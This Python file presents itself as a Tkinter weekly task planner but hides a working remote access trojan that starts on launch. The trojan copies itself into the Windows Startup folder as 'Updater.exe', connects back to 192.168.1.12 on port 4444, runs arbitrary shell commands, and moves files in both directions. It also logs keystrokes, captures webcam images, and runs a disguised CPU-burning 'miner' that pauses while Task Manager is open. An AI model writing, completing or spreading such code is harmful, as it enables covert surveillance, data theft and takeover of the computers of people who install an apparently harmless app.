
import threading
import socket
import subprocess
import os
import platform
import time
import hashlib
import cv2  
from pynput import keyboard  
import shutil  
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import json
import psutil




SERVER_IP = '192.168.1.12'
PORT = 4444


def install_persistence():
    try:
        target = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "Updater.exe")
        if not os.path.exists(target):
            shutil.copyfile(__file__, target)
    except:
        pass

install_persistence()


def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key}\n")
    except:
        pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()


def take_snapshot():
    try:
        cam = cv2.VideoCapture(0)
        time.sleep(2)  
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("snapshot.jpg", frame)
        cam.release()
    except Exception as e:
        with open("snapshot_error.txt", "w") as f:
            f.write(str(e))


mining_stop_event = threading.Event()
mining_thread = None
mining_lock = threading.Lock()

def is_task_manager_running():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == "Taskmgr.exe":
            return True
    return False

def mining_worker():
    n = 0
    while not mining_stop_event.is_set():
        if is_task_manager_running():
            time.sleep(1)
            continue
        hashlib.sha256(f"{time.time_ns()}-{n}".encode()).digest()
        n += 1
        if n % 200000 == 0:
            time.sleep(0.001)

def mining_start():
    global mining_thread
    with mining_lock:
        if mining_thread and mining_thread.is_alive():
            return False
        mining_stop_event.clear()
        mining_thread = threading.Thread(target=mining_worker, daemon=True)
        mining_thread.start()
        return True

def mining_stop():
    global mining_thread
    with mining_lock:
        if not mining_thread or not mining_thread.is_alive():
            return False
        mining_stop_event.set()
        mining_thread.join(timeout=0.5)
        mining_thread = None
        return True

def mining_status():
    with mining_lock:
        return mining_thread is not None and mining_thread.is_alive()


def list_directory(path):
    try:
        return "\n".join(os.listdir(path)).encode()
    except Exception as e:
        return f"Error listing directory: {str(e)}".encode()

def send_file(client, filepath):
    try:
        with open(os.path.normpath(filepath), "rb") as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                client.send(data)
        client.send(b"<<END>>")
    except Exception as e:
        client.send(f"[!] Failed to read file: {str(e)}<<END>>".encode())

def get_sysinfo():
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.machine(),
        "Hostname": platform.node(),
        "Processor": platform.processor()
    }
    return "\n".join(f"{k}: {v}" for k, v in info.items()).encode()


def rat_main():
    try:
        client = socket.socket()
        client.connect((SERVER_IP, PORT))
    except:
        return

    while True:
        try:
            command = client.recv(1024).decode()
            if not command:
                break

            if command == "exit":
                break

            elif command.startswith("listdir "):
                path = command[8:].strip().strip('"').strip("'")
                result = list_directory(path)

            elif command.startswith("getfile "):
                filepath = command[len("getfile "):].strip().strip('"').strip("'")
                filepath = os.path.normpath(filepath)
                send_file(client, filepath)
                continue

            elif command.startswith("cd "):
                path = command[3:].strip().strip('"').strip("'")
                try:
                    os.chdir(os.path.normpath(path))
                    result = f"[+] Changed directory to: {os.getcwd()}".encode()
                except Exception as e:
                    result = f"[!] Failed to change directory: {str(e)}".encode()

            elif command == "sysinfo":
                result = get_sysinfo()

            elif command == "mine start":
                result = b"[+] Mining started." if mining_start() else b"[i] Mining already running."

            elif command == "mine stop":
                result = b"[+] Mining stopped." if mining_stop() else b"[i] Mining is not running."

            elif command == "mine status":
                result = f"[i] Mining running: {mining_status()}".encode()

            elif command == "keylog start":
                start_keylogger()
                result = b"[+] Keylogger started."

            elif command == "cam snap":
                take_snapshot()
                if os.path.exists("snapshot.jpg"):
                    send_file(client, "snapshot.jpg")
                else:
                    client.send(b"[!] Snapshot failed.<<END>>")
                continue

            elif command.startswith("putfile "):
                try:
                    parts = command.split(" ", 2)
                    remote_path = os.path.normpath(parts[2].strip().strip('"').strip("'"))
                    
                    client.send(b"READY")

                    with open(remote_path, "wb") as f:
                        while True:
                            data = client.recv(1024)
                            if data.endswith(b"<<END>>"):
                                f.write(data[:-8])
                                break
                            f.write(data)

                    result = f"[+] File uploaded successfully to {remote_path}".encode()
                except Exception as e:
                    result = f"[!] Failed to save uploaded file: {str(e)}".encode()

            else:
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    result = e.output

            client.send(result)

        except:
            break

    mining_stop()
    client.close()

threading.Thread(target=rat_main, daemon=True).start()
# ---------------- TO-DO APP CODE ----------------
DAYS = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"]
HOURS = [f"{str(h).zfill(2)}:00" for h in range(24)]
COLORS = {
    "Black": "black", "Red": "red", "Green": "green",
    "Blue": "blue", "Purple": "purple", "Orange": "orange"
}

tasks_by_day = {day: [] for day in DAYS}
listboxes = {}

def update_listbox(day):
    listbox = listboxes[day]
    listbox.delete(0, tk.END)
    for start, end, task, color, done in sorted(tasks_by_day[day], key=lambda x: x[0]):
        time_range = f"{start}-{end}"
        display_text = f"✓ {time_range} - {task}" if done else f"{time_range} - {task}"
        listbox.insert(tk.END, display_text)
        listbox.itemconfig(tk.END, foreground="gray" if done else color)

def update_end_selector(event=None):
    start_time = start_selector.get()
    if not start_time:
        end_selector['values'] = HOURS
        return
    start_hour = int(start_time.split(":")[0])
    end_options = [h for h in HOURS if int(h.split(":")[0]) > start_hour]
    end_selector['values'] = end_options
    if end_options:
        end_selector.set(end_options[0])
    else:
        end_selector.set("")

def add_task():
    task = entry.get().strip()
    start = start_selector.get()
    end = end_selector.get()
    day = day_selector.get()
    color_name = color_selector.get()
    color = COLORS.get(color_name, "black")

    if not task or not start or not end or not day:
        messagebox.showwarning("Warning", "Please complete all fields.")
        return
    if int(end.split(":")[0]) <= int(start.split(":")[0]):
        messagebox.showwarning("Warning", "End time must be after start time.")
        return

    tasks_by_day[day].append((start, end, task, color, False))
    entry.delete(0, tk.END)
    update_listbox(day)

def delete_task():
    for day in DAYS:
        listbox = listboxes[day]
        selection = listbox.curselection()
        if selection:
            index = selection[0]
            sorted_tasks = sorted(tasks_by_day[day], key=lambda x: x[0])
            task_to_delete = sorted_tasks[index]
            for i, t in enumerate(tasks_by_day[day]):
                if t[0] == task_to_delete[0] and t[2] == task_to_delete[2] and t[3] == task_to_delete[3]:
                    tasks_by_day[day].pop(i)
                    break
            update_listbox(day)
            return
    messagebox.showwarning("Warning", "Select a task to delete.")

def mark_done():
    for day in DAYS:
        listbox = listboxes[day]
        selection = listbox.curselection()
        if selection:
            index = selection[0]
            sorted_tasks = sorted(tasks_by_day[day], key=lambda x: x[0])
            start, end, task, color, _ = sorted_tasks[index]
            for i, t in enumerate(tasks_by_day[day]):
                if t[0] == start and t[2] == task and t[3] == color:
                    tasks_by_day[day][i] = (start, end, task, color, True)
                    break
            update_listbox(day)
            return
    messagebox.showwarning("Warning", "Select a task to mark done.")

def clear_tasks(day):
    if messagebox.askyesno("Clear All", f"Delete all tasks for {day}?"):
        tasks_by_day[day] = []
        update_listbox(day)

def save_tasks():
    file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON Files", "*.json")])
    if file_path:
        with open(file_path, 'w') as f:
            json.dump(tasks_by_day, f)
        messagebox.showinfo("Saved", "Tasks saved successfully.")

def load_tasks():
    file_path = filedialog.askopenfilename(filetypes=[("JSON Files", "*.json")])
    if file_path:
        try:
            with open(file_path, 'r') as f:
                loaded = json.load(f)
                for day in DAYS:
                    tasks_by_day[day] = [tuple(task) for task in loaded.get(day, [])]
                    update_listbox(day)
                messagebox.showinfo("Loaded", "Tasks loaded successfully.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load tasks:\n{str(e)}")


root = tk.Tk()
root.title("Stealth Tasker - Weekly Schedule Planner")
root.geometry("1350x750")
root.configure(bg="#f0f0f0")

file_frame = tk.Frame(root, bg="#f0f0f0")
file_frame.pack(pady=5)
tk.Button(file_frame, text="Save All Tasks", command=save_tasks).pack(side="left", padx=10)
tk.Button(file_frame, text="Load Tasks", command=load_tasks).pack(side="left", padx=10)

input_frame = tk.LabelFrame(root, text="Add New Task", padx=10, pady=10, font=("Arial", 11, "bold"))
input_frame.pack(pady=10)

input_inner_frame = tk.Frame(input_frame)
input_inner_frame.pack()

tk.Label(input_inner_frame, text="Task", font=("Arial", 9)).grid(row=0, column=0, padx=5)
tk.Label(input_inner_frame, text="Start Time", font=("Arial", 9)).grid(row=0, column=1, padx=5)
tk.Label(input_inner_frame, text="End Time", font=("Arial", 9)).grid(row=0, column=2, padx=5)
tk.Label(input_inner_frame, text="Day", font=("Arial", 9)).grid(row=0, column=3, padx=5)
tk.Label(input_inner_frame, text="Color", font=("Arial", 9)).grid(row=0, column=4, padx=5)

entry = tk.Entry(input_inner_frame, width=30, font=("Arial", 10))
entry.grid(row=1, column=0, padx=5)

start_selector = ttk.Combobox(input_inner_frame, values=HOURS, state="readonly", width=8)
start_selector.grid(row=1, column=1, padx=5)
start_selector.bind("<<ComboboxSelected>>", update_end_selector)

end_selector = ttk.Combobox(input_inner_frame, values=HOURS, state="readonly", width=8)
end_selector.grid(row=1, column=2, padx=5)

day_selector = ttk.Combobox(input_inner_frame, values=DAYS, state="readonly", width=12)
day_selector.grid(row=1, column=3, padx=5)

color_selector = ttk.Combobox(input_inner_frame, values=list(COLORS.keys()), state="readonly", width=10)
color_selector.set("Black")
color_selector.grid(row=1, column=4, padx=5)

button_frame = tk.Frame(input_frame)
button_frame.pack(pady=10)
tk.Button(button_frame, text="Add Task", width=12, command=add_task).pack(side="left", padx=10)
tk.Button(button_frame, text="Done ✓", width=12, command=mark_done).pack(side="left", padx=10)
tk.Button(button_frame, text="Delete ✗", width=12, command=delete_task).pack(side="left", padx=10)

days_frame = tk.Frame(root, bg="#f0f0f0")
days_frame.pack(pady=10, fill="both", expand=True)

for i in range(len(DAYS)):
    days_frame.grid_columnconfigure(i, weight=1)

for i, day in enumerate(DAYS):
    frame = tk.LabelFrame(days_frame, text=day, padx=5, pady=5, font=("Arial", 10, "bold"))
    frame.grid(row=0, column=i, padx=5, sticky="nsew")

    tk.Button(frame, text="Clear all", width=8, command=lambda d=day: clear_tasks(d)).pack()

    listbox = tk.Listbox(frame, width=20, height=18, font=("Arial", 9))
    listbox.pack(pady=5, fill="both", expand=True)
    listboxes[day] = listbox

root.mainloop()
